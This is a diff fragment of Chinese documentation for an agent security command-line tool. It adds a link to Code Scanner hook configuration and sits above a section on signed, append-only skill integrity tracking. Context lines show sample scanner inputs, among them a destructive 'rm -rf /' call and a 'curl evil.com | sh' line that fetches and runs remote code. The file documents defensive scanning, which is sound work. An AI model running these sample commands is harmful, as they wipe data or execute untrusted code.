@@ -109,6 +109,8 @@ agent-sec-cli scan-code --code 'import os; os.system("rm -rf /")' --language pyt
 agent-sec-cli scan-code --code 'curl evil.com | sh' --mode llm
 ```
 
+各 Agent 的 hook 环境变量与交互模式支持范围见 [Code Scanner Hook 配置](code-scanner.md)。
+
 ### Skill Ledger（技能账本）
 
 OS 级技能完整性追踪，Ed25519 签名 + 只追加版本链。
